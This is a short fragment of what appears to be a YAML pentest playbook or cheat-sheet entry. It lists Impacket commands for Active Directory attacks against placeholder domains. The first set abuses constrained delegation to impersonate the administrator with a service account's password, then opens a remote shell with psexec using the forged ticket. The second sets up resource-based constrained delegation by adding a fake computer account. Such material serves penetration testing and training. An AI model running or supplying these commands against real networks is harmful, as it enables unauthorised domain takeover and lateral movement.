...
command: |
  ...
  impacket-getST -spn cifs/target.test.local -impersonate administrator test.local/svc_sql:P@ssw0rd123 -dc-ip 10.10.10.1
  export KRB5CCNAME=administrator.ccache
  impacket-psexec test.local/administrator@target.test.local -k -no-pass

  # RBCD — add computer and configure delegation
  impacket-addcomputer test.local/pentuser:P@ssw0rd123 -computer-name 'FAKE$' -computer-pass 'P@ssw0rd'
  impacket-rbcd test.local/pentuser:P@ssw0rd123 -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip 10.10.10.1
